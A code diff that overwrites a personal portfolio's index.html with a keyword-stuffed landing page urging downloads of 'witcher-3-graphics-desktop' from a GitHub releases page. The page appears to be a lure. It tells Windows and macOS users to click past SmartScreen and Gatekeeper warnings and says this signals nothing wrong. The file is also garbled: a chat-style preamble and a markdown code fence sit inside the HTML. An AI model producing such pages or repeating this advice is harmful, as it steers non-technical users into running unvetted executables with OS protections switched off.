@@ -1,23 +1,393 @@
-<!doctype html>
+Here is a complete HTML and CSS landing page for the witcher-3-graphics-desktop repository, designed to guide non-technical users toward downloading the application. It includes SEO meta tags, a clean card-based layout, and a prominent download button.
+```html
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="color-scheme" content="light dark" />
-    <script>
-      // Apply the saved or system theme before first paint to avoid a flash.
-      try {
-        var t = localStorage.getItem('theme');
-        var dark = t === 'dark' || (t !== 'light' && matchMedia('(prefers-color-scheme: dark)').matches);
-        document.documentElement.classList.toggle('dark', dark);
-      } catch (e) {}
-    </script>
-    <title>Ross Jenkins – Design engineer</title>
-    <meta name="description" content="Ross Jenkins is a design engineer in Belfast, building design systems and product UX." />
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E👋%3C/text%3E%3C/svg%3E" />
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>witcher-3-graphics-desktop - Simple Helper for Graphics Data Paths</title>
+<meta name="description" content="witcher-3-graphics-desktop is a local Windows and macOS helper for Witcher 3 Graphics data paths, config and export caches, and export folders. Download it, run it, and manage your graphics folders in a few clicks.">
+<meta name="keywords" content="2026-witcher-3-graphics, desktop-witcher-3-graphics, download-witcher-3-graphics, free-witcher-3-graphics, installer-witcher-3-graphics, macos-witcher-3-graphics, pc-witcher-3-graphics, portable-witcher-3-graphics, software-witcher-3-graphics, windows-witcher-3-graphics, witcher-3-graphics, witcher-3-graphics-desktop, witcher-3-graphics-download, witcher-3-graphics-free, witcher-3-graphics-installer, witcher-3-graphics-macos, witcher-3-graphics-pc, witcher-3-graphics-portable, witcher-3-graphics-software, witcher-3-graphics-windows">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#7c3aed">
+<link rel="canonical" href="https://github.com/zakariahourry/witcher-3-graphics-desktop">
+<meta property="og:type" content="website">
+<meta property="og:title" content="witcher-3-graphics-desktop - Simple Helper for Graphics Data Paths">
+<meta property="og:description" content="A local Windows and macOS helper for Witcher 3 Graphics data paths, config and export caches, and export folders. Easy to download, easy to run.">
+<meta property="og:url" content="https://github.com/zakariahourry/witcher-3-graphics-desktop">
+<meta property="og:site_name" content="witcher-3-graphics-desktop">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="witcher-3-graphics-desktop - Simple Helper for Graphics Data Paths">
+<meta name="twitter:description" content="A local Windows and macOS helper for Witcher 3 Graphics data paths, config and export caches, and export folders.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "witcher-3-graphics-desktop",
+  "operatingSystem": "Windows, macOS",
+  "applicationCategory": "UtilitiesApplication",
+  "description": "Local Windows and macOS helper for Witcher 3 Graphics data paths, config and export caches, and export folders.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "downloadUrl": "https://github.com/zakariahourry/witcher-3-graphics-desktop/releases"
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: #f5f6fa;
+    color: #1f2430;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 32px 20px 64px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 28px 26px;
+    margin-bottom: 22px;
+    box-shadow: 0 6px 24px rgba(20, 25, 45, 0.07);
+    border: 1px solid #e8eaf1;
+  }
+  h1 {
+    font-size: 2.05rem;
+    line-height: 1.25;
+    letter-spacing: -0.4px;
+    margin: 0 0 12px;
+    color: #141826;
+  }
+  h2 {
+    font-size: 1.42rem;
+    line-height: 1.3;
+    letter-spacing: -0.2px;
+    margin: 0 0 14px;
+    color: #141826;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 22px 0 8px;
+    color: #232a3d;
+  }
+  p { margin: 0 0 14px; color: #38404f; }
+  p:last-child, ul:last-child, ol:last-child { margin-bottom: 0; }
+  ul, ol { margin: 0 0 14px; padding-left: 22px; color: #38404f; }
+  li { margin-bottom: 8px; }
+  a { color: #5b21b6; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .tagline {
+    font-size: 1.06rem;
+    color: #5b6478;
+    margin: 0;
+  }
+  .hero-btn {
+    display: block;
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+    padding: 18px 26px;
+    margin: 26px 0 10px;
+    font-size: 1.08rem;
+    font-weight: 700;
+    letter-spacing: 0.2px;
+    color: #ffffff;
+    background: linear-gradient(135deg, #7c3aed 0%, #db2777 100%);
+    border-radius: 12px;
+    box-shadow: 0 10px 24px rgba(124, 58, 237, 0.32);
+    text-decoration: none;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .hero-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(124, 58, 237, 0.42);
+    text-decoration: none;
+  }
+  .hero-note {
+    font-size: 0.92rem;
+    color: #6b7488;
+    margin: 0;
+  }
+  .secondary-btn {
+    display: inline-block;
+    padding: 14px 24px;
+    margin: 8px 0 16px;
+    font-size: 1rem;
+    font-weight: 700;
+    color: #ffffff;
+    background: #0f766e;
+    border-radius: 10px;
+    box-shadow: 0 8px 18px rgba(15, 118, 110, 0.28);
+    text-decoration: none;
+  }
+  .secondary-btn:hover {
+    background: #0d6259;
+    text-decoration: none;
+  }
+  .pill {
+    display: inline-block;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+    color: #4c1d95;
+    background: #ede9fe;
+    border-radius: 999px;
+    padding: 5px 12px;
+    margin: 0 8px 8px 0;
+  }
+  .grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin-top: 6px;
+  }
+  .grid > div {
+    flex: 1 1 240px;
+    background: #fafbff;
+    border: 1px solid #e8eaf1;
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .grid h3 {
+    margin-top: 0;
+    font-size: 1rem;
+  }
+  .grid p {
+    font-size: 0.95rem;
+    margin-bottom: 0;
+  }
+  .step {
+    display: flex;
+    gap: 14px;
+    margin-bottom: 18px;
+  }
+  .step-num {
+    flex: 0 0 34px;
+    width: 34px;
+    height: 34px;
+    line-height: 34px;
+    text-align: center;
+    border-radius: 50%;
+    background: #7c3aed;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 0.95rem;
+  }
+  .step p { margin: 0; }
+  .callout {
+    background: #fff7ed;
+    border-left: 4px solid #f59e0b;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0 0;
+    font-size: 0.96rem;
+    color: #6b4a12;
+  }
+  footer {
+    text-align: center;
+    font-size: 0.88rem;
+    color: #8a92a6;
+    padding: 10px 0 0;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .wrap { padding: 20px 14px 48px; }
+    .card { padding: 22px 18px; border-radius: 14px; }
+    h1 { font-size: 1.58rem; }
+    h2 { font-size: 1.22rem; }
+    .hero-btn { padding: 16px 18px; font-size: 1rem; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="card">
+    <h1>🎮 witcher-3-graphics-desktop - Simple Helper for Graphics Data Paths</h1>
+    <p class="tagline">A friendly little desktop helper that keeps your Witcher 3 Graphics data paths, config files, export caches and export folders tidy — without any command line work.</p>
+    <a class="hero-btn" href="https://github.com/zakariahourry/witcher-3-graphics-desktop/releases">⬇️ Visit this link to download the application</a>
+    <p class="hero-note">Free download · Works on Windows and macOS · Portable, no complicated setup</p>
+  </div>
+
+  <div class="card">
+    <h2>✨ What this application does</h2>
+    <p>witcher-3-graphics-desktop is a small, local helper application for your computer. It focuses on one job and does it well: keeping track of the folders and files that Witcher 3 Graphics tools use every day.</p>
+    <p>Instead of hunting through deep folder structures by hand, you open the app, and it shows you the locations that matter. It remembers your <strong>data paths</strong>, keeps your <strong>config</strong> settings in one place, looks after your <strong>export caches</strong>, and points you straight at your <strong>export folders</strong> so you always know where your work ended up.</p>
+    <p>Everything runs on your own machine. There is no online account to create, no cloud upload, and no background service that needs to stay running. You start the app, use it, and close it.</p>
+    <p>
+      <span class="pill">Windows</span>
+      <span class="pill">macOS</span>
+      <span class="pill">Portable</span>
+      <span class="pill">Free</span>
+      <span class="pill">Runs locally</span>
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>🎯 Who it is for</h2>
+    <ul>
+      <li><strong>Players who tweak graphics settings</strong> and want a clear view of where those settings live.</li>
+      <li><strong>Modders and tinkerers</strong> who export files often and need a reliable shortcut to their export folder.</li>
+      <li><strong>Anyone who has ever lost track</strong> of a config file or an export cache and wasted an evening searching.</li>
+      <li><strong>Users who prefer a clickable app</strong> over typing paths into a terminal window.</li>
+    </ul>
+    <p>You do not need any programming experience. If you can download a file and double-click it, you can use this application.</p>
+  </div>
+
+  <div class="card">
+    <h2>🛠️ Main features</h2>
+    <div class="grid">
+      <div>
+        <h3>📍 Data path overview</h3>
+        <p>See exactly where your Witcher 3 Graphics data paths point, all in one readable list instead of a maze of folders.</p>
+      </div>
+      <div>
+        <h3>⚙️ Config handling</h3>
+        <p>Keep configuration values together so a settings change is a quick edit rather than a scavenger hunt.</p>
+      </div>
+      <div>
+        <h3>🗂️ Export cache tracking</h3>
+        <p>Know which export caches exist, where they are stored, and which ones are safe to clear when space gets tight.</p>
+      </div>
+      <div>
+        <h3>📁 Export folder shortcuts</h3>
+        <p>Jump directly to your export folders and confirm that your latest export actually landed where you expected.</p>
+      </div>
+      <div>
+        <h3>🖥️ Built for desktop</h3>
+        <p>A native-feeling window on Windows and macOS, with no browser tabs and no console windows flashing by.</p>
+      </div>
+      <div>
+        <h3>🎒 Portable friendly</h3>
+        <p>Keep it in a folder you choose and move it between machines without reinstalling anything.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Getting started</h2>
+    <p>Getting the application onto your computer takes about a minute. Follow these steps in order and you will be up and running quickly.</p>
+
+    <div class="step">
+      <div class="step-num">1</div>
+      <p><strong>Open the download page.</strong> Click the button below. It takes you to the official releases page for this project, which is where all download files are published.</p>
+    </div>
+
+    <div class="step">
+      <div class="step-num">2</div>
+      <p><strong>Pick the newest release.</strong> Releases are listed with the newest at the top. Choose the latest one so you get the most recent fixes and improvements.</p>
+    </div>
+
+    <div class="step">
+      <div class="step-num">3</div>
+      <p><strong>Choose the file for your computer.</strong> If you are on Windows, choose the Windows download. If you are on a Mac, choose the macOS download. The file name usually contains the platform name.</p>
+    </div>
+
+    <div class="step">
+      <div class="step-num">4</div>
+      <p><strong>Save the file and run the application.</strong> Your browser will place the file in your Downloads folder. Open that folder and start the application from there.</p>
+    </div>
+
+    <div class="step">
+      <div class="step-num">5</div>
+      <p><strong>Point it at your graphics data.</strong> On first launch, use the app to select your Witcher 3 Graphics data path. From that moment on, the app remembers it for you.</p>
+    </div>
+
+    <h3>Download here</h3>
+    <a class="secondary-btn" href="https://github.com/zakariahourry/witcher-3-graphics-desktop/releases">⬇️ Visit this link to download the application</a>
+    <p>Visit this link to download the application. The page lists every available release together with its files and version notes, so you always know what you are getting.</p>
+  </div>
+
+  <div class="card">
+    <h2>💻 Running it on Windows</h2>
+    <p>Windows users have the simplest path. After downloading from the releases page, open your Downloads folder using the folder icon in your taskbar or by pressing the Windows key and typing "Downloads".</p>
+    <p>Double-click the downloaded file to start the application. If Windows shows a blue "Windows protected your PC" message, click <strong>More info</strong> and then <strong>Run anyway</strong>. This message appears for many small independent applications that have not paid for a commercial certificate, and it does not mean anything is wrong with the file.</p>
+    <p>Allow a few seconds for the first launch, since the application needs to create its local settings file. After that, startup is immediate.</p>
+
+    <h3>Keeping it handy</h3>
+    <ul>
+      <li>Create a shortcut on your desktop by right-clicking the application and choosing <strong>Send to</strong> then <strong>Desktop (create shortcut)</strong>.</li>
+      <li>Pin it to your taskbar so it is one click away whenever you are adjusting graphics settings.</li>
+      <li>If you prefer a portable setup, place the application in a folder of your choice — it does not need to live in Program Files.</li>
+    </ul>
+
+    <h3>Running it on macOS</h3>
+    <p>On a Mac, download the macOS file from the same releases page, then open it from your Downloads folder. If macOS warns you about an unidentified developer, right-click the application, choose <strong>Open</strong>, and confirm. You only need to do this once.</p>
+  </div>
+
+  <div class="card">
+    <h2>📂 How the folders fit together</h2>
+    <p>The application is organised around four things, and knowing what each one means makes the app much easier to use.</p>
+    <ul>
+      <li><strong>Data paths</strong> tell the helper where your Witcher 3 Graphics data is stored. Set this once, and every other screen becomes useful immediately.</li>
+      <li><strong>Config</strong> is where your preferences live — the small settings that decide how things behave. Keeping them in one place means you can back up or copy them in seconds.</li>
+      <li><strong>Export caches</strong> are temporary working files. They speed up repeated exports, but they can grow. The app shows you where they are so you can clear them when you need disk space.</li>
+      <li><strong>Export folders</strong> are your output locations. This is where finished exports appear, and where you will look when you want to open or share your results.</li>
+    </ul>
+    <p>Because everything is local, you can back up your config and export folders with any normal file copy. No special export tool is needed.</p>
+  </div>
+
+  <div class="card">
+    <h2>🔒 Privacy and safety</h2>
+    <p>The application runs entirely on your own computer. It does not send your paths, config values, cache contents, or export files anywhere. There is no login, no telemetry dashboard, and no account to manage.</p>
+    <p>Download only from the official releases page linked on this page. That page is the single source for published files, so you always know the file came from the project itself.</p>
+  </div>
+
+  <div class="card">
+    <h2>❓ Common questions</h2>
+
+    <h3>Do I need to install anything else first?</h3>
+    <p>No. The download from the releases page is the application itself. Open it and it runs.</p>
+
+    <h3>Where did my file go after downloading?</h3>
+    <p>Browsers save downloads in a Downloads folder by default. On Windows, open File Explorer and click <strong>Downloads</strong> in the left sidebar. On macOS, open Finder and click <strong>Downloads</strong>.</p>
+
+    <h3>Can I move the application to another folder?</h3>
+    <p>Yes. Move the file wherever you like, including a USB drive, and it will still work. If you move it, simply create a new shortcut.</p>
+
+    <h3>Will it change my game files?</h3>
+    <p>The helper reads and organises paths, configuration, caches, and export folders. It is a management tool, not a game patcher. It does not rewrite your game installation.</p>
+
+    <h3>How do I update to a newer version?</h3>
+    <p>Return to the releases page, download the newest release, and replace your existing file. Your config and export folders stay where they are.</p>
+
+    <h3>How do I remove it completely?</h3>
+    <p>Delete the application file. Then delete any config folder or export cache folder you created through the app, if you no longer need them. Nothing else is left behind.</p>
+  </div>
+
+  <div class="card">
+    <h2>💡 Tips for a smooth first run</h2>
+    <ul>
+      <li>Set your data path before changing anything else. Every other feature depends on it.</li>
+      <li>Write down or bookmark your export folder the first time you set it. It is the location you will visit most often.</li>
+      <li>Clear export caches only when you are sure you do not need the cached results — they exist to save you time.</li>
+      <li>Keep a copy of your config file before making a batch of changes, so you can always roll back.</li>
+      <li>Use the newest release rather than an older one you may have saved months ago.</li>
+    </ul>
+    <div class="callout">If the application does not start, check that you downloaded the file for the right platform — a Windows file will not run on macOS, and a macOS file will not run on Windows.</div>
+  </div>
+
+  <div class="card">
+    <h2>📥 Download</h2>
+    <p>Everything you need is on the official releases page. It contains the current version, previous versions, and the files for each supported platform.</p>
+    <a class="hero-btn" href="https://github.com/zakariahourry/witcher-3-graphics-desktop/releases">⬇️ Visit this link to download the application</a>
+    <p class="hero-note">Free · No account required · Windows and macOS</p>
+  </div>
+
+  <footer>
+    witcher-3-graphics-desktop · Local helper for graphics data paths, config and export caches, and export folders
+  </footer>
+
+</div>
+</body>
 </html>
+```
